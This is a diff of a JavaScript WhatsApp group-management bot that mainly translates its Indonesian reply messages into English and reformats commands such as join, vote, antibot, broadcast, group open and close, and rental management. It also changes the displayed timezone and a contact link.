-        let result = `─── PENGENALAN LAGU ───\n`;
-        result += `Judul  : ${title}\n`;
-        result += `Artis  : ${artists}\n`;
-        result += `──────────────────────\n`;
+let result = `─── ⚔️ SONG IDENTIFICATION ───\n`;
+result += `Title   : ${title}\n`;
+result += `Artist  : ${artists}\n`;
+result += `────────────────────────────\n`;
 
         hydro.sendMessage(m.chat, { text: result }, { quoted: m });
     } catch (e) {
@@ -13425,10 +13160,12 @@ break
 case 'tozombie':
 case 'jadizombie': {
   if (!m.quoted) return m.reply(`Kirim/reply gambar dengan caption *${prefix + command}*`);
-  const { GoogleGenerativeAI } = require ("@google/generative-ai");
-  let mime = m.quoted.mimetype || "";
-  let defaultPrompt = "Create a 1/7 scale commercialized figure of the character in the illustration, in a realistic style and environment. Place the figure on a computer desk, using a circular transparent acrylic base without any text. On the computer screen, display the ZBrush modeling process of the figure. Next to the computer screen, place a BANDAI-style toy packaging box printed with the original artwork.";
-  if (!/image\/(jpe?g|png)/.test(mime)) return m.reply(`Format ${mime} tidak didukung! Hanya jpeg/jpg/png`);
+  const { GoogleGenerativeAI } = require("@google/generative-ai");  
+
+let mime = m.quoted.mimetype || "";  
+
+let defaultPrompt = "Generate a highly detailed 1/7 scale commercial figure based on the provided character illustration. The figure should have a realistic design and be placed on a modern computer desk environment. Use a circular transparent acrylic base with no text. On the computer monitor, display the ZBrush sculpting process of the same figure. Beside the monitor, include a BANDAI-style toy packaging box featuring the original artwork. Ensure professional lighting, realistic materials, and a high-end collectible appearance.";
+  if (!/image\/(jpe?g|png)/.test(mime)) return m.reply(`⚠️ Unsupported format: ${mime}\nOnly jpeg/jpg/png are allowed.`);
   let promptText = text || defaultPrompt;
   m.reply(mess.wait);
   try {
@@ -13653,7 +13390,7 @@ case 'readviewonce': {
 break;
 case 'join': {
     if (!Ahmad) return replytolak(mess.only.owner)
-    if (!text) return replyhydro(`Contoh penggunaan:\n${prefix + command} https://chat.whatsapp.com/xxx`)
+    if (!text) return replyhydro(`⚔️ Example usage:\n${prefix + command} https://chat.whatsapp.com/xxx`)
 
     const isUrl = (url) => url.match(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/gi)
 
@@ -13666,17 +13403,19 @@ case 'join': {
 
     await hydro.groupAcceptInvite(result)
         .then((res) => {
-            replyhydro('*[ Done ]* Berhasil join ke grup!')
+            replyhydro('⚔️ *[ DONE ]* Access granted. Successfully joined the group.')
         })
         .catch((err) => {
-            let errorStr = String(err)
-            if (errorStr.includes('400')) return replyhydro('Grup Tidak Di Temukan❗')
-            if (errorStr.includes('401')) return replyhydro('Bot Di Kick Dari Grup Tersebut❗')
-            if (errorStr.includes('409')) return replyhydro('Bot Sudah Join Di Grup Tersebut❗')
-            if (errorStr.includes('410')) return replyhydro('Url Grup Telah Di Setel Ulang❗')
-            if (errorStr.includes('500')) return replyhydro('Grup Penuh❗')
-            replyhydro('Gagal Join, pastikan link benar dan valid.')
-        })
+    let errorStr = String(err)
+
+    if (errorStr.includes('400')) return replyhydro('❌ Group not found.')
+    if (errorStr.includes('401')) return replyhydro('⛔ Access denied. Bot has been removed from this group.')
+    if (errorStr.includes('409')) return replyhydro('⚠️ Already connected to this group.')
+    if (errorStr.includes('410')) return replyhydro('⚠️ Group link has been reset.')
+    if (errorStr.includes('500')) return replyhydro('❌ Group is full.')
+
+    replyhydro('⚔️ Failed to join group. Ensure the link is valid.')
+})
 }
 break
 case 'poll': {
@@ -13684,8 +13423,7 @@ case 'poll': {
             let [poll, opt] = text.split("|")
             if (text.split("|") < 2)
 return await replyhydro(
-`Sebutkan pertanyaan dan minimal 2 pilihan\nContoh: ${prefix}poll Siapa admin terbaik?|Akbar,Hydro,Furina...`
-)
+`⚔️ Input required: question + minimum 2 options\nExample:\n${prefix}poll Who is the best admin?|Akbar,Hydro,Furina...`)
             let options = []
             for (let i of opt.split(',')) {
 options.push(i)
@@ -13700,9 +13438,16 @@ values: options
         break
         case 'vote': {
             if (!m.isGroup) return replytolak(mess.only.group)
-            if (m.chat in vote) return replyhydro(`_Masih ada suara di chat ini!_\n\n*${prefix}deletevote* - untuk menghapus suara`)
-            if (!text) return replyhydro(`Masukkan Alasan Memilih, Contoh: *${prefix + command} Pemilik Tampan*`)
-            replyhydro(`Pemungutan suara dimulai!\n\n*${prefix}upvote* - untuk upvote\n*${prefix}downvote* - untuk downvote\n*${prefix}checkvote* - untuk memeriksa suara\n*${prefix} deletevote* - untuk menghapus suara`)
+            if (m.chat in vote) return replyhydro(`⚠️ A vote is already active in this chat!\n\n*${prefix}deletevote* - to remove the current vote`)
+
+if (!text) return replyhydro(`⚔️ Enter a reason for the vote.\nExample: *${prefix + command} Best Admin*`)
+
+replyhydro(`🗳️ Voting has started!
+
+*${prefix}upvote* - vote yes 👍
+*${prefix}downvote* - vote no 👎
+*${prefix}checkvote* - check results 📊
+*${prefix}deletevote* - cancel vote ❌`)
             vote[m.chat] = [q, [], []]
             await sleep(1000)
             upvote = vote[m.chat][1]
@@ -13734,7 +13479,7 @@ Please Type Below
             break
                case 'upvote': {
             if (!m.isGroup) return replytolak(mess.only.group)
-            if (!(m.chat in vote)) return replyhydro(`_*tidak ada voting di grup ini!*_\n\n*${prefix}vote* - untuk memulai voting`)
+            if (!(m.chat in vote)) return replyhydro(`❌ No active voting session in this group.\n\n*${prefix}vote* - start a new vote`)
             isVote = vote[m.chat][1].concat(vote[m.chat][2])
             wasVote = isVote.includes(m.sender)
             if (wasVote) return replyhydro('You have Voted')
@@ -13839,10 +13584,10 @@ if (!quoted) return replyhydro(`Reply Image/Video`)
 hydro.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
 if (/image/.test(mime)) {
 anuan = await hydro.downloadAndSaveMediaMessage(quoted)
-hydro.sendMessage(m.chat, {image: {url:anuan}, caption: `Ini dia!!`, fileLength: "999", viewOnce : true},{quoted: m })
+hydro.sendMessage(m.chat, {image: {url:anuan}, caption: `here it is!!`, fileLength: "999", viewOnce : true},{quoted: m })
 } else if (/video/.test(mime)) {
 anuanuan = await hydro.downloadAndSaveMediaMessage(quoted)
-hydro.sendMessage(m.chat, {video: {url:anuanuan}, caption: `Ini dia!!`, fileLength: "99999999", viewOnce : true},{quoted: m })
+hydro.sendMessage(m.chat, {video: {url:anuanuan}, caption: `here it is!!`, fileLength: "99999999", viewOnce : true},{quoted: m })
 }
 }
 break
@@ -13874,9 +13619,14 @@ global.paptt = [
 	hydro.sendFile(m.chat, url, null, 'Tch, dasar sangean', m)
 }
 break
- case 'alkitab':{ 
-     if (!text) return reply( `uhm.. teksnya mana?\n\ncontoh:\n${prefix + command} kejadian`)
-     let res = await axios.get(`https://alkitab.me/search?q=${encodeURIComponent(text)}`, { headers: { "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36" } }) 
+ case 'alkitab': {
+    if (!text) return reply(`⚔️ Where is the query?\n\nExample:\n${prefix + command} genesis`)
+
+    let res = await axios.get(`https://alkitab.me/search?q=${encodeURIComponent(text)}`, {
+        headers: {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36"
+        }
+    }) 
   
      let $ = cheerio.load(res.data) 
      let result = [] 
@@ -13939,7 +13689,7 @@ case 'botstatus': {
         const h = Math.floor((seconds % (3600 * 24)) / 3600)
         const m = Math.floor((seconds % 3600) / 60)
         const s = Math.floor(seconds % 60)
-        return `*${d}* Hari *${h}* Jam *${m}* Menit`
+        return `⚔️ *${d}* Days • *${h}* Hours • *${m}* Minutes`
     }
     
     const runtimeFormat = (seconds) => {
@@ -13947,7 +13697,7 @@ case 'botstatus': {
         const h = Math.floor((seconds % (3600 * 24)) / 3600)
         const m = Math.floor((seconds % 3600) / 60)
         const s = Math.floor(seconds % 60)
-        return `*${d}* ☀️ Hari\n│ *${h}* 🕐 Jam\n│ *${m}* ⏰ Menit\n│ *${s}* ⏱️ Detik`
+        return `⚔️ *Time Elapsed*\n\n*${d}* ☀️ Days\n│ *${h}* 🕐 Hours\n│ *${m}* ⏰ Minutes\n│ *${s}* ⏱️ Seconds`
     }
 
     const formatp = (bytes) => `${(bytes / 1024 / 1024 / 1024).toFixed(2)} GB`
@@ -13995,8 +13745,8 @@ case 'botstatus': {
     const percentUsed = totalMemAll > 0 ? (usedMemAll / totalMemAll) * 100 : 0
 
     const runtimeText = runtimeFormat(process.uptime())
-    const waktu = moment().tz("Asia/Jakarta").format('HH:mm:ss')
-    const tanggal = moment().tz("Asia/Jakarta").locale("id").format('dddd, D MMMM YYYY')
+    const waktu = moment().tz("Africa/Accra").format('HH:mm:ss')
+    const tanggal = moment().tz("Africa/Accra").locale("id").format('dddd, D MMMM YYYY')
 
     const endProcess = performance.now()
     const responInSeconds = ((endProcess - startProcess) / 1000).toFixed(4)
@@ -14082,10 +13832,10 @@ case 'botstatus': {
     else pingIcon = "🔴"
 
     const response = `
-╭───⏱️ *[ STATUS BOT ]* ⏱️
+╭───⏱️ *[ BOT STATUS ]* ⏱️
 │
 ├ 💠 *Ping:* ${pingIcon} ${latensi.toFixed(0)} ms
-├ 💠 *Respon:* ${responInSeconds} detik
+├ 💠 *Response:* ${responInSeconds} seconds
 │
 ├ 📈 *Uptime:*
 │  ${runtimeText}
@@ -14094,19 +13844,19 @@ case 'botstatus': {
 │  🔵 Platform : ${os.platform()}
 │  💻 OS        : ${osName}
 │  🧿 Hostname : ${os.hostname()}
-│  🌎 Zona      : ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+│  🌍 Timezone : ${Intl.DateTimeFormat().resolvedOptions().timeZone}
 │  🧠 CPU       : ${cpuModel}
-│  🔩 Core      : ${cpuCore} Core
+│  🔩 Cores     : ${cpuCore} Cores
 │  ⚡ Speed     : ${avgSpeed.toFixed(2)} MHz
 │
 ├ 📊 *RAM Usage:*
 │  ${formatp(usedMemAll)} / ${formatp(totalMemAll)} (${percentUsed.toFixed(1)}%)
 │
 ├ ⚡ *CPU Usage:*
-│  ${cpuUsagePercent.toFixed(1)}% dari ${cpuCore} Core
+│  ${cpuUsagePercent.toFixed(1)}% of ${cpuCore} Cores
 │
-├ 🗓️ *Tanggal:* ${tanggal}
-├ 🕒 *Waktu:* ${waktu} WIB
+├ 🗓️ *Date:* ${tanggal}
+├ 🕒 *Time:* ${waktu}
 ╰─────────────────────
 `.trim()
 
@@ -14118,37 +13868,39 @@ externalAdReply: {
 title: "🏓 Status bot online >.<",
 body: botname,
 thumbnailUrl: chart.getUrl(),
-sourceUrl: "https://store.hydrohost.web.id",
+sourceUrl: "https://wa.me//233533416608",
 mediaType: 1,
 renderLargerThumbnail: true
 }}}, { quoted: m })
 }
 break
 case 'listadmin': {
-    if (!m.isGroup) return m.reply('❌ Fitur ini hanya bisa digunakan di dalam grup!');
+    if (!m.isGroup) return m.reply('⚔️ This command is restricted to group chats only.')
     let metadata = await hydro.groupMetadata(m.chat);
     let admins = metadata.participants.filter(p => p.admin !== null);
 
     let adminList = admins.map((a, i) => {
-        let jid = a.id.split('@')[0];
-        let role, emoji;
-        if (a.admin === 'superadmin') {
-            role = '*Pemilik*';
-            emoji = '👑';
-        } else {
-            role = '*Admin Biasa*';
-            emoji = '👮';
-        }
-        return `${i + 1}. @${jid} ( ${emoji} ${role} )`;
-    }).join('\n');
+    let jid = a.id.split('@')[0];
+    let role, emoji;
 
-    let caption = `👑 *Daftar Admin Grup ${metadata.subject}*\n\n${adminList}`;
+    if (a.admin === 'superadmin') {
+        role = '*Owner*';
+        emoji = '👑';
+    } else {
+        role = '*Admin*';
+        emoji = '👮';
+    }
+
+    return `${i + 1}. @${jid} ( ${emoji} ${role} )`;
+}).join('\n');
+
+    let caption = `⚔️ *Admin Command Structure — ${metadata.subject}*\n\n${adminList}`;
     hydro.sendMessage(m.chat, { text: caption, mentions: admins.map(a => a.id) }, { quoted: m });
 }
 break;
 case 'groupset': case 'antilink': {
-    if (!m.isGroup) return replytolak('❌ Fitur ini hanya bisa digunakan di grup!')
-    if (!(isGroupAdmins || Ahmad)) return replytolak('❌ Hanya admin yang bisa menggunakan fitur ini!')
+    if (!m.isGroup) return replytolak('⚔️ This command is restricted to group chats only.')
+    if (!(isGroupAdmins || Ahmad)) return replytolak('⚠️ Access denied. Admin privileges required.')
 
     try {
         const makeRow = (title, listDB, cmd) => {
@@ -14197,18 +13949,18 @@ case 'groupset': case 'antilink': {
             viewOnceMessage: {
                 message: {
                     interactiveMessage: {
-                        body: { text: `⚙️ Pengaturan Grup *${groupMetadata.subject}*` },
-                        footer: { text: `✨ ${botname} - Proteksi Grup` },
+                        body: { text: `⚔️ Group Control Panel — *${groupMetadata.subject}*` },
+                        footer: { text: `⚔️ ${botname} • Advanced Group Protection` },
                         header: { title: "🛡️ Group Protection & Features" },
                         nativeFlowMessage: {
                             buttons: [{
                                 name: "single_select",
                                 buttonParamsJson: JSON.stringify({
-                                    title: "Pilih fitur untuk diatur",
-                                    sections: [
-                                        { title: "━━━〔 🔗 Proteksi Link 〕━━━", rows: rowsLink },
-                                        { title: "━━━〔 💬 Proteksi Chat 〕━━━", rows: rowsChat },
-                                        { title: "━━━〔 ⚡ Fitur Tambahan 〕━━━", rows: rowsExtra },
+                                    title: "Select a feature to configure",
+sections: [
+    { title: "━━━〔 🔗 Link Protection 〕━━━", rows: rowsLink },
+    { title: "━━━〔 💬 Chat Protection 〕━━━", rows: rowsChat },
+    { title: "━━━〔 ⚡ Additional Features 〕━━━", rows: rowsExtra },
                                     ]
                                 })
                             }]
@@ -14221,8 +13973,8 @@ case 'groupset': case 'antilink': {
         await hydro.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id })
 
     } catch (err) {
-        console.error("GROUPSET ERROR:", err)
-        m.reply("❌ Gagal menampilkan pengaturan grup.")
+        console.error("⚔️ GROUP SYSTEM ERROR:", err)
+m.reply("❌ Unable to load group configuration panel.")
     }
 }
 break
@@ -14234,98 +13986,129 @@ case 'antibot': {
     const currentAction = antibotSettings[m.chat] || 'delete'
 
     if (!text) {
-        return replyhydro(`🛡️ *KONFIGURASI ANTIBOT*
-        
-Status: *${isAktif ? 'AKTIF (ON) ✅' : 'MATI (OFF) ❌'}*
-Mode Sanksi: *${currentAction.toUpperCase()}*
+    return replyhydro(`🛡️ *ANTIBOT CONFIGURATION*
 
-*Cara Setting:*
+Status: *${isAktif ? 'ACTIVE (ON) ✅' : 'OFF (DISABLED) ❌'}*
+Action Mode: *${currentAction.toUpperCase()}*
+
+*How to Configure:*
 • ${prefix}antibot on
 • ${prefix}antibot off
 • ${prefix}antibot set kick
 • ${prefix}antibot set delete`)
-    }
+}
 
     if (args[0] === 'on') {
-        if (isAktif) return replyhydro('✅ AntiBot sudah aktif sebelumnya.')
-        antibot.push(m.chat)
+    if (isAktif) return replyhydro('✅ AntiBot is already active.')
+    antibot.push(m.chat)
+    saveAntibot()
+    replyhydro('✅ AntiBot has been *enabled*.')
+} 
+else if (args[0] === 'off') {
+    if (!isAktif) return replyhydro('❌ AntiBot is already disabled.')
+    let index = antibot.indexOf(m.chat)
+    if (index !== -1) {
+        antibot.splice(index, 1)
         saveAntibot()
-        replyhydro('✅ AntiBot berhasil *diaktifkan*.')
-    } 
-    else if (args[0] === 'off') {
-        if (!isAktif) return replyhydro('❌ AntiBot sudah mati sebelumnya.')
-        let index = antibot.indexOf(m.chat)
-        if (index !== -1) {
-            antibot.splice(index, 1)
-            saveAntibot()
-        }
-        replyhydro('❌ AntiBot berhasil *dimatikan*.')
-    } 
-    else if (args[0] === 'set') {
-        if (args[1] === 'kick') {
-            antibotSettings[m.chat] = 'kick'
-            saveAntibotSettings()
-            replyhydro('⚙️ Mode diubah: *Hapus Pesan & Kick Member*')
-        } else if (args[1] === 'delete') {
-            antibotSettings[m.chat] = 'delete'
-            saveAntibotSettings()
-            replyhydro('⚙️ Mode diubah: *Hanya Hapus Pesan*')
-        } else {
-            replyhydro('⚠️ Opsi salah. Pilih: *kick* atau *delete*')
-        }
-    } else {
-        replyhydro('Perintah tidak dikenal.')
     }
+    replyhydro('❌ AntiBot has been *disabled*.')
+} 
+else if (args[0] === 'set') {
+    if (args[1] === 'kick') {
+        antibotSettings[m.chat] = 'kick'
+        saveAntibotSettings()
+        replyhydro('⚙️ Mode updated: *Delete Message & Kick Member*')
+    } else if (args[1] === 'delete') {
+        antibotSettings[m.chat] = 'delete'
+        saveAntibotSettings()
+        replyhydro('⚙️ Mode updated: *Delete Message Only*')
+    } else {
+        replyhydro('⚠️ Invalid option. Choose: *kick* or *delete*')
+    }
+} else {
+    replyhydro('❌ Unknown command.')
+}
 }
 break
 case 'antitagsw': {
-    if (!m.isGroup) return replytolak('❌ Perintah ini hanya bisa digunakan di grup!');
-    if (!isGroupAdmins) return replytolak('❌ Hanya *admin grup* yang dapat mengatur fitur ini.');
+    if (!m.isGroup) return replytolak('❌ This command can only be used in groups!');
+if (!isGroupAdmins) return replytolak('❌ Only *group admins* can configure this feature.');
 
-    if (args[0] === 'on') {
-        if (antitagsw.includes(m.chat)) return replyhydro('✅ Fitur *Anti Tag Status* sudah aktif di grup ini.');
-        antitagsw.push(m.chat);
-        fs.writeFileSync('./database/antitagsw.json', JSON.stringify(antitagsw, null, 2));
-        replyhydro('✅ Fitur *Anti Tag Status* berhasil *diaktifkan*.');
-    } else if (args[0] === 'off') {
-        if (!antitagsw.includes(m.chat)) return replyhydro('❌ Fitur *Anti Tag Status* belum aktif.');
-        antitagsw = antitagsw.filter(gid => gid !== m.chat);
-        fs.writeFileSync('./database/antitagsw.json', JSON.stringify(antitagsw, null, 2));
-        replyhydro('✅ Fitur *Anti Tag Status* berhasil *dinonaktifkan*.');
-    } else {
-        replyhydro(`⚙️ *Pengaturan Anti Tag Status (Story)*\n\nGunakan:\n• ${prefix}antitagsw on\n• ${prefix}antitagsw off`);
-    }
+if (args[0] === 'on') {
+    if (antitagsw.includes(m.chat)) return replyhydro('✅ *Anti Status Tag* is already active in this group.');
+    antitagsw.push(m.chat);
+    fs.writeFileSync('./database/antitagsw.json', JSON.stringify(antitagsw, null, 2));
+    replyhydro('✅ *Anti Status Tag* has been successfully *enabled*.');
+} else if (args[0] === 'off') {
+    if (!antitagsw.includes(m.chat)) return replyhydro('❌ *Anti Status Tag* is not active.');
+    antitagsw = antitagsw.filter(gid => gid !== m.chat);
+    fs.writeFileSync('./database/antitagsw.json', JSON.stringify(antitagsw, null, 2));
+    replyhydro('✅ *Anti Status Tag* has been successfully *disabled*.');
+} else {
+    replyhydro(`⚙️ *Anti Status Tag (Story) Settings*
+
+Usage:
+• ${prefix}antitagsw on
+• ${prefix}antitagsw off`);
+}
 }
 break;
             case 'bctext': case 'broadcasttext': case 'broadcast': {
 			    if (!Ahmad) return replytolak(mess.only.owner)
-		            if (!q) return replyhydro(mess.query.text)
-		        const data = await store.chats.all()
-        for (let i of data) {
-           hydro.sendMessage(i.id, {text: `${ownername}'s Siaran\n\nPesan : ${q}` })
-           await sleep(1000)
-        }
+if (!q) return replyhydro(mess.query.text)
+
+const data = await store.chats.all()
+
+for (let i of data) {
+    await hydro.sendMessage(i.id, {
+        text: `📡 *${ownername}'s Broadcast*
+
+📝 Message:
+${q}`
+    })
+    await sleep(1000)
+}
         }
         break
         case 'broadcastimage': case 'bcimage': case 'broadcastvideo': case 'broadcastvid':
-if(!Ahmad) return reply(mess.only.owner)
-        if (!q) return replyhydro(mess.query.text)
-        let getGroups = await hydro.groupFetchAllParticipating()
-        let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
-        let xeoncast = groups.map(v => v.id)
-        replyhydro(` Menyiarkan dalam ${xeoncast.length} Obrolan Grup, dalam ${xeoncast.length * 1,5} detik`)
-        for (let i of xeoncast) {
-let txt = `${ownername}'s Siaran\n\nPesan : ${q}`
-if(/image/.test(mime)) {
-let media = await quoted.download()
-await hydro.sendMessage(i, { image:media,  caption: txt,mentions:participants.map(a => a.id) })
+if (!Ahmad) return reply(mess.only.owner)
+if (!q) return replyhydro(mess.query.text)
+
+let getGroups = await hydro.groupFetchAllParticipating()
+let groups = Object.entries(getGroups).map(entry => entry[1])
+let xeoncast = groups.map(v => v.id)
+
+// fix time calculation (use * 1.5 not 1,5)
+let estimatedTime = Math.ceil(xeoncast.length * 1.5)
+
+replyhydro(`📡 Broadcasting to *${xeoncast.length}* group chats...\n⏳ Estimated time: *${estimatedTime} seconds*`)
+
+for (let i of xeoncast) {
+    let txt = `📡 *${ownername}'s Broadcast*
+
+📝 Message:
+${q}`
+
+    if (/image/.test(mime)) {
+        let media = await quoted.download()
+        await hydro.sendMessage(i, {
+            image: media,
+            caption: txt,
+            mentions: participants.map(a => a.id)
+        })
+    } else if (/video/.test(mime)) {
+        let media = await quoted.download()
+        await hydro.sendMessage(i, {
+            video: media,
+            caption: txt,
+            mentions: participants.map(a => a.id)
+        })
+    } else {
+        await hydro.sendMessage(i, { text: txt })
+    }
 }
-if(/video/.test(mime)){
-let media = await quoted.download()
-await hydro.sendMessage(i, { video:media,  caption: txt, mentions:participants.map(a => a.id) })
-}
-            }
-        replyhydro(`Berhasil Disiarkan di Grup ${xeoncast.length}`)      
+
+replyhydro(`✅ Successfully broadcasted to *${xeoncast.length}* groups.`)      
         break
 case 'block': case 'ban': {
 		if (!Ahmad) return replytolak(mess.only.owner)
@@ -14376,30 +14159,38 @@ case 'group': case 'gc': {
 if (!m.isGroup) return replytolak(mess.only.group)
 if (!isAdmins && !Ahmad) return reply(mess.only.admin)
 if (!isBotAdmins) return replytolak(mess.only.badmin)
-if (!q) return replyhydro(`Send orders ${command} _options_\nOptions : close & open\nExample : ${command} close`)
+if (!q) return replyhydro(`Usage: ${command} _options_
+Options: open / close
+Example: ${command} close`)
+
 if (args[0] == 'close') {
-  reply(`┌─┉─ • ─┉─  ── .✦
+  reply(`┌─┉─ • ─┉─  ── ✦
 │
-│𝘆𝝰𝗵 𝗶𝘁'𝘀 𝘁𝗶𝗺𝗲 𝘁𝝾 𝗰𝗹𝝾𝘀𝗲𝗱
-│𝗻𝝰𝗻𝘁𝗶 𝗱𝗶𝗯𝘂𝗸𝝰 𝗹𝝰𝗴𝗶 𝘆𝝰𝝰...
+│ 🔒 *Group Closed*
+│ Only admins can send messages now.
+│ The group will reopen later.
 │
-└─┉─¡! • !¡─┉─ ── .✦`)
-hydro.groupSettingUpdate(from, 'announcement')
+└─┉─ • ─┉─ ── ✦`)
+  hydro.groupSettingUpdate(from, 'announcement')
+
 } else if (args[0] == 'open') {
-  reply(`♥︎ ۪۪┈─𝗵𝝰𝗹𝝾 𝗶𝘁'𝘀 𝘁𝗶𝗺𝗲 𝘁𝝾 𝝾𝗽𝗲𝗻──────╮
+  reply(`┌─┉─ • ─┉─  ── ✦
+│
+│ 🔓 *Group Opened*
+│ Everyone can chat again.
+│ Stay active and respectful.
+│
+│ 💬 *Quote*
+│ "Life is too short to let others
+│ decide what makes you happy."
+│
+└─┉─ • ─┉─ ── ✦`)
+  hydro.groupSettingUpdate(from, 'not_announcement')
 
-╭── ࣪ 𖥻 ๋ 📜 *𝐐𝘂𝝾𝘁𝗲𝘀*
-┊   ―"𝘀𝗲𝗯𝝰𝗯 𝗵𝗶𝗱𝘂𝗽 𝘁𝗲𝗿𝗹𝝰𝗹𝘂 
-┊𝘀𝗶𝗻𝗴𝗸𝝰𝘁 𝘂𝗻𝘁𝘂𝗸 𝗺𝗲𝗺𝗯𝗶𝝰𝗿𝗸𝝰𝗻
-┊𝝾𝗿𝝰𝗻𝗴 𝗹𝝰𝗶𝗻 𝗺𝗲𝗻𝗲𝗻𝘁𝘂𝗸𝝰𝗻 𝝰𝗽𝝰
-┊𝘆𝝰𝗻𝗴 𝗺𝗲𝗺𝗯𝘂𝝰𝘁 𝗸𝗶𝘁𝝰 𝗯𝝰𝗵𝝰𝗴𝗶𝝰"
-╰─────────────────
-
-𝗷𝝰𝗻𝗴𝝰𝗻 𝗹𝘂𝗽𝝰 𝗯𝗲𝗿𝘀𝘆𝘂𝗸𝘂𝗿 𝘆𝝰 𝗯𝘂𝝰𝘁 𝗵𝝰𝗿𝗶 𝗶𝗻𝗶...`)
-hydro.groupSettingUpdate(from, 'not_announcement')
 } else {
-replyhydro(`Contoh: ${prefix + command} close/open`)
-}}
+  replyhydro(`Example: ${prefix + command} open / close`)
+}
+}
 break
 case 'imgtopix': {
     try {
@@ -14769,17 +14560,17 @@ case 'addsewa': {
 
         if (!text || text.split(' ').length < 2) {
             return replyhydro(
-                `Gunakan dengan cara:\n` +
-                `${prefix + command} *linkgc waktu*\n\n` +
-                `Contoh:\n${prefix + command} https://chat.whatsapp.com/XXX 30d\n\n` +
-                `*CATATAN:*\n` +
-                `d = hari, h = jam, m = menit, s = detik, y = tahun`
+                `Usage:\n` +
+                `${prefix + command} *group_link duration*\n\n` +
+                `Example:\n${prefix + command} https://chat.whatsapp.com/XXX 30d\n\n` +
+                `*NOTES:*\n` +
+                `d = days, h = hours, m = minutes, s = seconds, y = years`
             );
         }
 
         const [link, waktu] = text.split(' ');
         if (!isUrl(link) || !link.includes('https://chat.whatsapp.com/')) {
-            return replyhydro("❌ Link grup WhatsApp tidak valid!");
+            return replyhydro("❌ Invalid WhatsApp group link!");
         }
 
         const inviteCode = link.split('https://chat.whatsapp.com/')[1].split('?')[0];
@@ -14787,21 +14578,21 @@ case 'addsewa': {
         const groupMeta = await hydro.groupMetadata(groupId);
 
         if (checkSewaGroup(groupMeta.id, sewa)) {
-            return replyhydro("⚠️ Bot sudah disewa di grup ini!");
+            return replyhydro("⚠️ This group already has an active rental!");
         }
 
         addSewaGroup(groupMeta.id, waktu, sewa);
 
         replyhydro(
-            `✅ Berhasil menambahkan sewa!\n\n` +
-            `🏷️ Nama : *${groupMeta.subject}*\n` +
-            `🆔 ID   : *${groupMeta.id}*\n` +
-            `⏳ Durasi : *${waktu}*`
+            `✅ Rental successfully added!\n\n` +
+            `🏷️ Name   : *${groupMeta.subject}*\n` +
+            `🆔 ID     : *${groupMeta.id}*\n` +
+            `⏳ Duration: *${waktu}*`
         );
 
     } catch (err) {
         console.error("ADDSEWA ERROR:", err);
-        replyhydro("❌ Gagal menambahkan sewa.\n\nMohon Matikan Fitur\n- Setujui Anggota Baru");
+        replyhydro("❌ Failed to add rental.\n\nPlease disable:\n- Approve New Members");
     }
 }
 break;
@@ -14810,7 +14601,7 @@ case 'delsewa': {
 
     if (text) {
         let targetId = text.trim()
-        if (!checkSewaGroup(targetId, sewa)) return replytolak("❌ Grup tidak ditemukan di database!")
+        if (!checkSewaGroup(targetId, sewa)) return replytolak("❌ Group not found in database!")
 
         try {
             await hydro.groupLeave(targetId)
@@ -14819,10 +14610,10 @@ case 'delsewa': {
         sewa.splice(getSewaPosition(targetId, sewa), 1)
         fs.writeFileSync('./database/sewa.json', JSON.stringify(sewa, null, 2))
 
-        return replyhydro(`✅ Sukses menghapus sewa & keluar dari grup.\nID: ${targetId}`)
+        return replyhydro(`✅ Rental removed successfully & bot left the group.\nID: ${targetId}`)
     }
 
-    if (sewa.length === 0) return replytolak("❌ Tidak ada sewa aktif.")
+    if (sewa.length === 0) return replytolak("❌ No active rentals found.")
 
     let listGrupSewa = []
     for (let s of sewa) {
@@ -14834,7 +14625,7 @@ case 'delsewa': {
             listGrupSewa.push({
                 header: "",
                 title: groupName,
-                description: `ID: ${s.id}\nSisa: ${sisaWaktu}`,
+                description: `ID: ${s.id}\nRemaining: ${sisaWaktu}`,
                 id: `.delsewa ${s.id}`
             })
         } catch (e) {}
@@ -14845,15 +14636,15 @@ case 'delsewa': {
             message: {
                 messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
                 interactiveMessage: {
-                    body: { text: `📜 *DAFTAR GRUP SEWA*\nTotal: ${sewa.length} Grup` },
+                    body: { text: `📜 *RENTED GROUP LIST*\nTotal: ${sewa.length} Groups` },
                     nativeFlowMessage: {
                         buttons: [
                             {
                                 name: "single_select",
                                 buttonParamsJson: JSON.stringify({
-                                    title: "PILIH GRUP",
+                                    title: "SELECT GROUP",
                                     sections: [
-                                        { title: "List Sewa", rows: listGrupSewa }
+                                        { title: "Rental List", rows: listGrupSewa }
                                     ]
                                 })
                             }
@@ -14862,25 +14653,25 @@ case 'delsewa': {
                 }
             }
         }
-    }, { quoted: m }, {});
+    }, { quoted: m }, {})
 
     await hydro.relayMessage(msg.key.remoteJid, msg.message, {
         messageId: msg.key.id
-    });
+    })
 }
 break
 
 case 'listsewa': {
-    if (sewa.length === 0) return replyhydro("📭 Belum ada data sewa.")
+    if (sewa.length === 0) return replyhydro("📭 No active rentals found.")
 
-    let teks = `📋 *Daftar Sewa Aktif*\n\n`
+    let teks = `📋 *Active Rental List*\n\n`
     for (let x of sewa) {
-        teks += `🏷️ Nama : *${await getGcName(x.id)}*\n`
+        teks += `🏷️ Name : *${await getGcName(x.id)}*\n`
         teks += `🆔 ID   : ${x.id}\n`
         if (x.expired === "PERMANENT") {
-            teks += `⏳ Expired : PERMANENT\n\n`
+            teks += `⏳ Expiry : PERMANENT\n\n`
         } else {
-            teks += `⏳ Expired : ${msToDate(x.expired - Date.now())}\n\n`
+            teks += `⏳ Expiry : ${msToDate(x.expired - Date.now())}\n\n`
         }
     }
 
@@ -14888,9 +14679,9 @@ case 'listsewa': {
 }
 break
 case 'ceksewa': {
-    if (!m.isGroup) return replytolak("❌ Perintah ini hanya bisa digunakan di dalam grup!");
+    if (!m.isGroup) return replytolak("❌ This command can only be used in groups!");
 
